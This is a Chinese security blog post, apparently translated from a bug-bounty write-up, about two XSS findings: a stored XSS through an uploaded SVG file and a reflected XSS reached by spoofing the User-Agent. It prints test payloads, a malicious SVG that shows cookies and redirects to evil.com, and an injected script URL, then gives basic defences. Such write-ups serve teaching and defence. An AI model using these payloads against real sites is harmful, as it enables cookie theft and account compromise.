#  未知技术大揭秘，让XSS漏洞无处遁形！0x2   
 迪哥讲事   2024-09-09 23:09  
  
forever young  
  
  
  
不论昨天如何，都希望新的一天里，我们大家都能成为更好的人，也希望我们都是走向幸福的那些人  
  
  
  
01  
  
通过SVG文件上传的存储型XSS  
  
安全小白团  
  
  
书接上回《[未知技术大揭秘，让XSS漏洞无处遁形！0x1](http://mp.weixin.qq.com/s?__biz=MzU2NzY5MjAwNQ==&mid=2247486592&idx=1&sn=0c3295e87893502da662699482b6bdac&chksm=fc98130acbef9a1ca12b8ac0d633bf1423a34c55c062a620cb55d954561a9a33c5a407295fe8&scene=21#wechat_redirect)  
》  
  
  
关键词：文件上传——手动测试。  
  
  
在完成信息收集后，我查找了aquatone的结果，然后我发现了一个有趣的子域。  
  
  
URL xxx 是我们的目标。当你开始对一个目标进行测试时，您必须了解目标的所有功能，例如注册、登录、忘记密码等等。  
  
  
当  
我尝试在注册表单上创建帐户时，我发现需要填写一些内容，例如用户名、电子邮件、密码、组织名称。  
  
  
让我们在用户名输入中添加一个有效负载，例如  
  
```
```  
```
"> < img  src = x  onerror = alert(document.domain) > {{7*7}}'

如果您查找之前的有效负载，您会发现它正在测试不同的漏洞，例如：
 img 标签用于测试 XSS
 {{7*7}} 用于测试 SSTI
' 用于测试 SQLi
```  
```
```  
  
  
  
我们的 XSS 负载被接受并且成功执行了。  
  
  
  
  
好吧，我没有就此停止，因为还有很多东西需要测试，但我会重点关注关系表单中的文件上传功能字段。  
  
  
文件上传漏洞：当网站允许用户上传文件而未对输入进行适当验证或清理时，就会发生文件上传漏洞。这可能导致包括执行恶意脚本或上传可能危及系统安全或窃取敏感信息的有害文件在内的各种安全问题。  
  
  
什么是 SVG：  
可缩放矢量图形 (SVG) 是一种基于 XML 的矢量图像格式，可以包含交互式图形和动画图形。  
SVG 文件还可以包含 JavaScript 代码，可用于各种任务，包括动画。  
由于 SVG 文件可以被视为 HTML 中的图像，因此可以将它们放置在图像标签中并完美呈现，例如：  
  
```
<img src="rectangle.svg" alt="Rectangle" height="20" width="30">
```  
  
  
SVG文件( "rectangle.svg")可以类似于以下内容  
  
```
```  
```
<svg width="200" height="100" xmlns="http://www.w3.org/2000/svg">
  <rect x="20" y="20" width="160" height="60" fill="blue" />
</svg>
<!-->用于创建蓝色矩形的 SVG 文件<-->
```  
```
```  
  
我能够上传包含恶意脚本的SVG文件，但该脚本没有被正确清理，从而导致脚本执行。  
  
这是我创建的恶意 SVG文件。  
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("You have been hacked !! " + "\n" + "Domain: " + document.domain + "\n" + "Cookie: " + document.cookie );
      window.location.href="https://evil.com"
</script>
</svg>
```  
```
```  
  
我们来上传吧。  
  
  
  
  
  
  
上传，我们将收到存储型 XSS。  
  
  
  
  
我详细报告了该漏洞，并且已被接受。  
  
  
  
  
  
  
02  
  
未知技术的XSS  
  
安全小白团  
  
  
关键字：robots.txt — User-agent — Burp Suite。  
  
  
假设我们有一个目标网站 https://targets.com。我做了一下信息收集，但只找到了一个页面，该页面返回了一个内部错误，没有什么重要信息。当我进行模糊测试时，除了以下robots.txt 文件，没有发现其他内容：  
  
  
  
  
如果你是一名CTF玩家或者之前玩过CTF ，那么你的脑海中通常会出现以下想法：如果我转到/settings 页面并将请求中的用户代理替换为响应中看到的值，会发生什么？  
  
  
当我用Burp Suite拦截请求并将User-Agent 更改为Mediapartners-Google时，我并没有在/settings页面发现什么，但我发现了许多可接受的页面，这表明我们现在有了一个全新的完整Web应用程序。我没想到会是这样，我感到很惊讶。  
  
  
就像我们处理的大多数目标一样。手动和自动方法是我们的关键。在运行Burp Suite 扫描后，我发现了一些有用的结果，其中之一是XSS 漏洞。以下是我发现的漏洞的所有详细信息。  
  
  
进入Burp Suite：-> 代理 -> 拦截  
  
  
  
  
转到拦截中的选项。  
  
  
  
  
转到“匹配并替换”，然后将User-agent替换为新的（Mediapartners-Google），以拦截所有使用它的请求。  
  
  
  
  
访问我们的易受攻击的 URL   
  
```
https://targets.com//bundle/cardjdv1i”><script>alert(document.cookie)</script>mnybm?id=25020×tamp=1704865352 
```  
  
我们得到了XSS。  
  
  
  
  
当我再次更改用户代理以确认错误配置来自它时，我没有得到任何信息，因此是时候报告我们的漏洞了。  
  
  
查找以下代码以了解可能发生的情况：  
  
```
// 这只是一个简单的Java Script代码示例，而不是实际代码
<html>
  <body>
    <p>This <span id="exampleElement"></span></p>
  </body>
  <script>
    // Get the User-Agent value from the request
    var userAgent = navigator.userAgent;
    
    // Check if the User-Agent value is "Mediapartners-Google"
    if (userAgent.indexOf("Mediapartners-Google") !== -1) {
      // Assuming the URL is https://targets.com/bundle/<user-input>/
      var userInput = window.location.pathname.split("/")[2];
      document.getElementById("exampleElement").innerHTML = userInput;
    }
</script>
</html>
```  
```
```  
  
  
  
  
03  
  
如何防范XSS漏洞  
  
安全小白团  
  
  
  
1. 验证和清理输入：始终验证和清理用户输入，以防止注入恶意脚本。  
  
2. 使用内容安全策略 (CSP)：CSP 是一项安全功能，有助于防止跨站点脚本和其他代码注入攻击。  
  
3. 输出编码：在输出用户提供的数据时，对其进行编码，以防止浏览器将其解释为HTML。  
  
4. 部署WAF（Web应用防火墙）：WAF可以帮助过滤恶意请求并防止XSS攻击。  
  
  
如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
## 往期回顾  
  
  
[ssrf绕过新思路](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495841&idx=1&sn=bbf477afa30391b8072d23469645d026&chksm=e8a5fac2dfd273d42344f18c7c6f0f7a158cca94041c4c4db330c3adf2d1f77f062dcaf6c5e0&scene=21#wechat_redirect)  
  
  
[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)  
  
  
[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
[](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
  
  
[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
  
  
  
  
  
  
  
参考及来源：  
  
https://infosecwriteups.com/how-i-found-multiple-xss-vulnerabilities-using-unknown-techniques-74f8e705ea0d  
  
  
  
  
04  
  
免责&版权声明  
  
安全小白团  
  
  
  
安全小白团是帮助用户了解信息安全技术、安全漏洞相关信息的微信公众号。安全小白团提供的程序(方法)可能带有攻击性，仅供安全研究与教学之用，用户将其信息做其他用途，由用户承担全部法律及连带责任，安全小白团不承担任何法律及连带责任。  
欢迎大家转载，  
转载请注明出处。  
如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaic181R2RnYicpic6GbdiazMpqiaIrCaa2fbjKHtn8kiayKGGBeW0icqgpfzNqmibShxqsn2DMDggpaxnKjrY1sCWZXWng/640?wx_fmt=png "")  
  
转发  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ItKicuUNQ9EMVAsW4tKUASR3dbCFrBib4ibY05IeDzhxf9b1KMxjzLaukAYt0NfYLchE5eibmaSHibiamfT9wDQibytww/640?wx_fmt=png "")  
  
收藏  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jwUk1NOJTytvIJd6VYGIIp4cA0qNKtMv7tAziatxhK4whicjTxAPklWUEfjejWvRbEbJjKDoRhZpUaPaEibpFYbcQ/640?wx_fmt=png "")  
  
点赞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/K2CMDET8V6nLGsmoNxVfZytJuZzowIia6LuVg70JTa2jGiaozMwyvhG9eKOKVa5rzaj1QOgfPm4a2lsEJ7GN7zCQ/640?wx_fmt=png "")  
  
在看  
  
